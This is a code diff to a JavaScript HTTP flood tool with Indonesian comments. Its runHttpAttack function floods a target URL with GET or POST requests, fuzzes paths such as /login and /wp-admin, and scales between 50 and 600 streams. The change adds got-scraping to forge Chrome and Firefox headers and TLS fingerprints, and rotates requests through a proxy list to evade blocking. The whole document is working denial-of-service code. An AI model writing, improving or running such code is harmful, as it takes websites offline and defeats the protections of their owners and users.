@@ -1,8 +1,7 @@
-const TlsClient = require('tls-client');
-const { CookieJar } = require('tough-cookie');
+const { gotScraping } = require('@apify/got-scraping');
 const url = require('url');
 const crypto = require('crypto');
-const { getBypassOptions, getRandomPayload } = require('./extensions');
+const { getRandomPayload, proxyList } = require('./extensions');
 
 function runHttpAttack(targetUrl, durationSeconds, attackType) {
     const isPostAttack = attackType === 'post';
@@ -13,8 +12,6 @@ function runHttpAttack(targetUrl, durationSeconds, attackType) {
     let localError = 0;
 
     const target = url.parse(targetUrl);
-    let client = new TlsClient();
-    const cookieJar = new CookieJar();
 
     // --- Algoritma Pacing Cerdas & Manipulasi Serangan ---
     let attackState = {
@@ -24,10 +21,6 @@ function runHttpAttack(targetUrl, durationSeconds, attackType) {
     };
     const MAX_STREAMS = 600;
     const MIN_STREAMS = 50;
-
-    // --- Siklus Koneksi (Connection Cycling) ---
-    let requestCounter = 0;
-    let nextCycle = 500 + Math.floor(Math.random() * 1000);
 
     // --- URL Fuzzing Tingkat Lanjut ---
     const commonPaths = ['/api/v2/user', '/login', '/shop/item', '/search', '/wp-admin', '/blog/post'];
@@ -65,30 +58,37 @@ function runHttpAttack(targetUrl, durationSeconds, attackType) {
     };
 
     const attack = () => {
-        // Terapkan Siklus Koneksi
-        requestCounter++;
-        if (requestCounter >= nextCycle) {
-            client = new TlsClient(); // Buat koneksi & sidik jari TLS baru
-            requestCounter = 0;
-            nextCycle = 500 + Math.floor(Math.random() * 1000);
-        }
-
         const finalUrl = fuzzUrl(targetUrl);
-        const options = getBypassOptions(target, cookieJar);
         
+        // got-scraping menangani header, sidik jari TLS, dan cookie secara otomatis.
+        const options = {
+            // Pilih generator header acak (chrome, firefox, etc.)
+            headerGeneratorOptions: {
+                browsers: [
+                    { name: 'chrome', minVersion: 120 },
+                    { name: 'firefox', minVersion: 120 },
+                ],
+                devices: ['desktop'],
+                operatingSystems: ['windows', 'macos'],
+            },
+            // Gunakan proxy jika tersedia
+            proxyUrl: proxyList.length > 0 ? proxyList[Math.floor(Math.random() * proxyList.length)] : undefined,
+            timeout: { request: 15000 },
+            retry: { limit: 0 }, // Jangan coba lagi jika gagal, langsung hitung sebagai error
+        };
+
         localSent++;
 
         if (isPostAttack) {
-            const { payload, contentType } = getRandomPayload();
-            options.body = payload;
-            options.headers['content-type'] = contentType;
-            client.post(finalUrl, options).catch(() => {
-                localError++;
-            });
+            const { payload, type } = getRandomPayload();
+            if (type === 'json') {
+                options.json = payload;
+            } else {
+                options.form = payload;
+            }
+            gotScraping.post(finalUrl, options).catch(() => { localError++; });
         } else {
-            client.get(finalUrl, options).catch(() => {
-                localError++;
-            });
+            gotScraping.get(finalUrl, options).catch(() => { localError++; });
         }
     };
  
